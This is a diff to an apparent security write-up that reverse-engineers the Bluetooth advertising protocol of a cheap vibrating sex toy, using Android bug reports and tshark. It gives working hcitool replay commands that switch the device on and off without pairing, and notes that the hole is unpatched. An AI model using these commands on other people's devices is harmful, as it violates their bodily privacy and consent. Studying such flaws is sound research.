@@ -38,7 +38,7 @@ adb install love-spouse-1-8-9.apk
 
 **Controlling the vibrating egg**
 
-Press each of the vibration modes (9) and request a bugreport. This will contain Bluetooth logs that we will analyze
+Press each of the vibration modes (9) and request a bugreport. This will contain Bluetooth logs that we will analyze.
 
 <p align="center">
 <img src="love-spouse-classic-mode.png" width="250">
@@ -64,7 +64,7 @@ First, we open it with Wireshark. We can observe many advertising packets sent b
 We will formulate the following hypothesis: 
 > vibration commands are sent in advertising packets. 
  
-This explains why there is seemingly no pairing with the phone
+This explains why there is seemingly no pairing with the phone.
 
 To extract these packets, we will use `tshark` and filter to retrieve only opcodes of type `0x2037`. These correspond to advertising data packets.
 
@@ -122,7 +122,7 @@ For the other modes, we have:
 
 We can try to directly replay mode 1 with the `hcitool` command:
 
-Before if you haven't already done so. You must install bluez
+Before if you haven't already done so. You must install bluez.
 ```
 sudo apt update
 sudo apt install bluez
@@ -137,8 +137,10 @@ If we do this, the sex toy does not vibrate.
 
 Two things are missing:
 
-Configure advertising parameters (general parameters + MAC address)
-Enable advertising with the previously configured parameters + send the packet
+- Configure advertising parameters (general parameters + MAC address)
+- Enable advertising with the previously configured parameters + send the packet
+
+**Find advertissing settings**
 
 To find this information, we can use opcode `0x2036` for general parameters:
 
@@ -158,7 +160,7 @@ tshark -r btsnooz_hci.log -Y "bthci_cmd.opcode == 0x2036"
 
 These parameters appear before each advertising data packet. For example, the first packet was at frame `165`, and we have a parameter packet at frame `159`. 
 
-Similarly for the last data packet (turn off) which was at frame `291` with a parameter packet at 285.
+Similarly for the last data packet (turn off) which was at frame `291` with a parameter packet at `285`.
 
 Let's now display the payload (which is always the same regardless of the selected packet):
 
@@ -167,6 +169,8 @@ tshark -r btsnooz_hci.log -Y "bthci_cmd.opcode == 0x2036" -x
 0000  01 36 20 19 00 13 00 a0 00 00 d2 00 00 07 01 00   .6 .............
 0010  00 00 00 00 00 00 00 01 01 00 01 00 00            .............
 ```
+
+**Find random MAC address**
 
 To find the device's MAC address, opcode `0x2035` will be useful:
 
@@ -186,7 +190,11 @@ tshark -r btsnooz_hci.log -Y "bthci_cmd.opcode == 0x2035" -x
 
 With each new transmission, there is a new MAC address. The sex toy listens passively to everything happening on advertising. We can use a d  random MAC address and the vibrator will still activate.
 
-We now have everything needed to make our adult toy vibrate:
+**Final Payload - Activate Mode 1**
+
+We now have everything needed to make our adult toy vibrate.
+
+In the final script, one last paquet has been added. It allows you to activate and send advertising from Bluez.
 
 ```
 sudo hciconfig hci0 down
@@ -197,12 +205,14 @@ sudo hcitool -i hci0 cmd 0x08 0x0037 00 03 01 16 02 01 01 0e ff ff 00 6d b6 43 c
 sudo hcitool -i hci0 cmd 0x08 0x0039 01 01 00 00 00 00 00 00 00 00
 ```
 
-
-This packet simply enables advertising:
-```
-sudo hcitool -i hci0 cmd 0x08 0x0039 01 01 00 00 00 00 00 00 00 00
-```
 Once these commands are sent, the vibrating egg starts vibrating on mode 1.
+
+**Final Payload - Turn Off the sex toy**
+
+In addition to the payload shutdown, we need to add the last packet sent after a sleep allows stopping advertising transmission
+```
+sudo hcitool -i hci0 cmd 0x08 0x0039 00 00 00 00 00 00 00 00 00 00
+```
 
 To turn off the device, we can send the following commands:
 
@@ -210,12 +220,6 @@ To turn off the device, we can send the following commands:
 sudo hcitool -i hci0 cmd 0x08 0x0037 00 03 01 16 02 01 01 0e ff ff 00 6d b6 43 ce 97 fe 42 7c e5 15 7d 03 03 8f ae
 sudo hcitool -i hci0 cmd 0x08 0x0039 01 01 00 00 00 00 00 00 00 00
 sleep 2
-sudo hcitool -i hci0 cmd 0x08 0x0039 00 00 00 00 00 00 00 00 00 00
-```
-
-The last packet sent after a sleep allows stopping advertising transmission:
-
-```
 sudo hcitool -i hci0 cmd 0x08 0x0039 00 00 00 00 00 00 00 00 00 00
 ```
 
@@ -236,7 +240,7 @@ Running our script requires root privileges.
 
 ### Security Implications
 
-Most entry-level Bluetooth sex toys are built on the same model and share this vulnerability. 
+Most cheap Bluetooth sex toys are built on the same model and share this vulnerability. 
 
 This protocol has been publicly reverse-engineered for at least two years, yet companies manufacturing these adult toys have not issued any security patches or design changes. 
 
